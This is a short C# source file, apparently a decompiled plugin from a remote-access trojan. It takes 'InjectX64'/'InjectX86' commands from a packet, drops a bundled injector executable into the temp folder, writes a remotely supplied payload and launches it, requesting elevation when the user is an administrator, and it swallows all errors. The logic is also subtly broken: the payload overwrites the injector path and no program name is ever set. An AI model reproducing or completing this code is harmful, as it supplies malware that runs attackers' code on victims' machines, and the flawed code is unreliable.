using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;
using Leb128;
using Plugin.Properties;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (!(text == "InjectX64"))
			{
				if (text == "InjectX86")
				{
					string path = Path.Combine(Path.GetTempPath(), "Injectorx86.exe");
					string text2 = Path.Combine(Path.GetTempPath(), (string)array[1]);
					if (!File.Exists(path))
					{
						File.WriteAllBytes(path, Resource1.x86);
					}
					if (!File.Exists(text2))
					{
						File.WriteAllBytes(path, (byte[])array[2]);
					}
					ProcessStartInfo processStartInfo = new ProcessStartInfo();
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						processStartInfo.Verb = "runas";
					}
					processStartInfo.Arguments = text2 + " " + (string)array[3];
					Process process = new Process();
					process.StartInfo = processStartInfo;
					process.Start();
				}
			}
			else
			{
				string path2 = Path.Combine(Path.GetTempPath(), "Injectorx64.exe");
				string text3 = Path.Combine(Path.GetTempPath(), (string)array[1]);
				if (!File.Exists(path2))
				{
					File.WriteAllBytes(path2, Resource1.x64);
				}
				if (!File.Exists(text3))
				{
					File.WriteAllBytes(path2, (byte[])array[2]);
				}
				ProcessStartInfo processStartInfo2 = new ProcessStartInfo();
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					processStartInfo2.Verb = "runas";
				}
				processStartInfo2.Arguments = text3 + " " + (string)array[3];
				Process process2 = new Process();
				process2.StartInfo = processStartInfo2;
				process2.Start();
			}
		}
		catch (Exception)
		{
		}
	}
}
